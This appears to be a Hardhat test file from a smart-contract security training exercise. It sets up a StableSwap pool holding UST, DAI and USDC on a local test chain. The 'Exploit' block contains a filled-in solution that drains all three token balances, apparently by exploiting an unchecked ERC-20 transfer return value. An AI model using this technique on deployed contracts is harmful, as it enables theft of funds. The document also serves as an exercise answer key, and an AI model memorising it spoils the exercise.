const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Unchecked Returns Exercise 3', function () {
    
    let deployer, attacker;
    const TOKENS_INITIAL_SUPPLY = ethers.utils.parseEther('100000000', 6); // $100M
    const TOKENS_IN_STABLESWAP = ethers.utils.parseEther('1000000', 6); // $1M
    const CHAIN_ID = 31337;

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, attacker] = await ethers.getSigners();

        // Deploy Tokens
        // Deploy UST
        const USTFactory = await ethers.getContractFactory(
            'contracts/unchecked-returns-3/UST.sol:UST',
            deployer
        );
        this.ust = await USTFactory.deploy(TOKENS_INITIAL_SUPPLY, "Terra USD", "UST", 6);
        // Deploy DAI
        const DAIFactory = await ethers.getContractFactory(
            'contracts/unchecked-returns-3/DAI.sol:DAI',
            deployer
        );
        this.dai = await DAIFactory.deploy(CHAIN_ID);
        // Deploy USDC
        const USDCFactory = await ethers.getContractFactory(
            'contracts/unchecked-returns-3/USDC.sol:USDC',
            deployer
        );
        this.usdc = await USDCFactory.deploy();
        await this.usdc.initialize(
            "Center Coin", "USDC", "USDC", 6, deployer.address,
            deployer.address, deployer.address, deployer.address
        );

        // Mint Tokens to Deployer
        await this.dai.mint(deployer.address, TOKENS_INITIAL_SUPPLY);
        await this.usdc.configureMinter(deployer.address, TOKENS_INITIAL_SUPPLY);
        await this.usdc.mint(deployer.address, TOKENS_INITIAL_SUPPLY);

        // Deploy StableSwap
        const StableSwapFactory = await ethers.getContractFactory(
            'contracts/unchecked-returns-3/StableSwap.sol:StableSwap',
            deployer
        );
        // const StableSwapFactory = await ethers.getContractFactory(
        //     'contracts/unchecked-returns-3/solution/StableSwapSecured.sol:StableSwapSecured',
        //     deployer
        // );
        this.stableSwap = await StableSwapFactory.deploy([
            this.ust.address, this.usdc.address, this.dai.address
        ]);

        // Check allowed tokens
        expect(await this.stableSwap.isSupported(this.usdc.address, this.dai.address)).to.equal(true);
        expect(await this.stableSwap.isSupported(this.usdc.address, this.ust.address)).to.equal(true);
        
        // Send tokens to StableSwap
        await this.ust.transfer(this.stableSwap.address, TOKENS_IN_STABLESWAP);
        await this.dai.transfer(this.stableSwap.address, TOKENS_IN_STABLESWAP);
        await this.usdc.transfer(this.stableSwap.address, TOKENS_IN_STABLESWAP);

        // Check StableSwap Balance
        expect(await this.ust.balanceOf(this.stableSwap.address)).to.equal(TOKENS_IN_STABLESWAP)
        expect(await this.dai.balanceOf(this.stableSwap.address)).to.equal(TOKENS_IN_STABLESWAP)
        expect(await this.usdc.balanceOf(this.stableSwap.address)).to.equal(TOKENS_IN_STABLESWAP)

        // Swap works, balances are ok
        let amount = ethers.utils.parseEther('100', 6);
        await this.usdc.approve(this.stableSwap.address, amount)
        await expect(this.stableSwap.swap(this.usdc.address, this.dai.address, amount)).to.not.be.reverted;
        expect(await this.usdc.balanceOf(this.stableSwap.address)).to.equal(TOKENS_IN_STABLESWAP.add(amount));
        expect(await this.dai.balanceOf(this.stableSwap.address)).to.equal(TOKENS_IN_STABLESWAP.sub(amount));

        // Swap fails without allowance
        await expect(this.stableSwap.swap(this.usdc.address, this.dai.address, amount)).to.be.reverted;

        this.stableSwapDAIBalance = await this.dai.balanceOf(this.stableSwap.address);
        this.stableSwapUSDCBalance = await this.usdc.balanceOf(this.stableSwap.address);
        this.stableSwapUSTBalance = await this.ust.balanceOf(this.stableSwap.address);
    });


    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        await this.stableSwap.connect(attacker).swap(this.ust.address, this.dai.address, this.stableSwapDAIBalance);
        await this.stableSwap.connect(attacker).swap(this.ust.address, this.usdc.address, this.stableSwapUSDCBalance);
        await this.stableSwap.connect(attacker).swap(this.ust.address, this.ust.address, this.stableSwapUSTBalance);
    });

    
    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker was able to drain the entire protocol balance!
        expect(await this.usdc.balanceOf(this.stableSwap.address)).to.equal(0);
        expect(await this.dai.balanceOf(this.stableSwap.address)).to.equal(0);
        expect(await this.ust.balanceOf(this.stableSwap.address)).to.equal(0);

        expect(await this.usdc.balanceOf(attacker.address)).to.equal(this.stableSwapUSDCBalance);
        expect(await this.dai.balanceOf(attacker.address)).to.equal(this.stableSwapDAIBalance);
        expect(await this.ust.balanceOf(attacker.address)).to.equal(this.stableSwapUSTBalance);
    });

});
